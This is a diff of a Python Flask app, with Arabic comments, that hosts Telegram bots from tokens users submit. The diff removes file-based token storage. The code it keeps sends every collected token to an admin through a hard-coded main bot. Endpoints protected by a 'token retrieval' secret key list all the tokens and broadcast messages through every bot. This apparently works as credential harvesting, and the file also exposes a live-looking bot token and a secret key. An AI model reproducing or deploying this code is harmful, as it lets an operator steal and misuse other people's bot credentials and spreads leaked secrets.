@@ -2,13 +2,11 @@ from flask import Flask, request, jsonify
 import telebot
 import threading
 import requests
-import json
-import os
 
 app = Flask(__name__)
 
-# ملف تخزين التوكنات
-TOKENS_FILE = "tokens.json"
+# قائمة التوكنات المخزنة داخل الكود
+bots = {}
 
 # مفتاح سري لاستعادة التوكنات
 SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"
@@ -22,29 +20,13 @@ MAIN_BOT_TOKEN = "7647664924:AAFFFndSW8pdfn5BytglDLELe7fm-uSOlS8"
 # قفل لمنع التعارض بين الخيوط
 bots_lock = threading.Lock()
 
-# تحميل التوكنات المخزنة
-def load_tokens():
-    if os.path.exists(TOKENS_FILE):
-        with open(TOKENS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    return {}
-
-# حفظ التوكنات في الملف
-def save_tokens():
-    with open(TOKENS_FILE, "w", encoding="utf-8") as f:
-        json.dump(bots, f, indent=4)
-
-# تحميل التوكنات عند بدء التشغيل
-bots = load_tokens()
-
 # دالة للتحقق من صحة التوكن
 def is_valid_token(token):
     try:
         url = f"https://api.telegram.org/bot{token}/getMe"
         response = requests.get(url, timeout=5)
         return response.status_code == 200 and response.json().get("ok", False)
-    except requests.RequestException as e:
-        print(f"Error validating token: {e}")
+    except requests.RequestException:
         return False
 
 # دالة لبدء تشغيل البوت
@@ -68,7 +50,6 @@ def send_tokens_to_admin():
     try:
         main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)
         main_bot.send_message(ADMIN_ID, message_text, parse_mode="Markdown")
-        print("تم إرسال التوكنات إلى الأدمن.")
     except Exception as e:
         print(f"Error sending tokens: {e}")
 
@@ -89,7 +70,6 @@ def add_bot():
             return jsonify({"error": "Bot already running"}), 400
 
         bots[token] = {"status": "active"}
-        save_tokens()
         
         bot_thread = threading.Thread(target=start_bot, args=(token,), daemon=True)
         bot_thread.start()
@@ -108,7 +88,7 @@ def get_tokens():
     with bots_lock:
         return jsonify({"tokens": list(bots.keys())})
 
-# API لإرسال الرسالة إلى جميع البوتات
+# API لإرسال رسالة إلى جميع البوتات
 @app.route("/send_message", methods=["GET"])
 def send_message():
     provided_key = request.args.get("key")
@@ -147,15 +127,7 @@ def stop_bots():
         return jsonify({"error": "Unauthorized"}), 401
 
     with bots_lock:
-        for token in list(bots.keys()):
-            try:
-                bot_instance = telebot.TeleBot(token)
-                bot_instance.stop_polling()
-            except Exception as e:
-                print(f"Error stopping bot {token}: {e}")
-
         bots.clear()
-        save_tokens()
 
     return jsonify({"message": "All bots stopped successfully"})
 
